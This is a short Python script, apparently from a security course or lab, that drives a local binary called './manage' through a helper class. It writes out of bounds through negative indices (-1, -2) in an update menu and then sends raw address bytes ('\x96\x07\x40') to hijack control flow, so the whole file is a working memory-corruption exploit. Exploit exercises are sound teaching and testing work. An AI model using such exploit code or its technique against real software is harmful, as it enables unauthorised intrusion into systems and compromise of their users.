#!/usr/bin/python3
import os, sys
parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(parent_dir)
from helper import Program


# TODO: Rewrite this function (do not touch anything else).
def exploit():
    prog = Program("./manage")

    for i in range(4):
        print(prog.read_line())

    prog.send_line("A")

    prog.send_line("A")
    print(prog.read_line())
    prog.send_line("A")
    print(prog.read_line())

    for i in range(4):
        print(prog.read_line())

    prog.send_line("U")

    prog.send_line("-1")
    print(prog.read_line())
    prog.send_line("AAA")
    print(prog.read_line())

    for i in range(4):
        print(prog.read_line())

    prog.send_line("U")

    prog.send_line("-2")
    print(prog.read_line())
    prog.send_line("\x96\x07\x40")
    print(prog.read_line())

    print(prog.read_line())
    print(prog.read_line())
    print(prog.read())

       


if __name__ == "__main__":
    exploit()
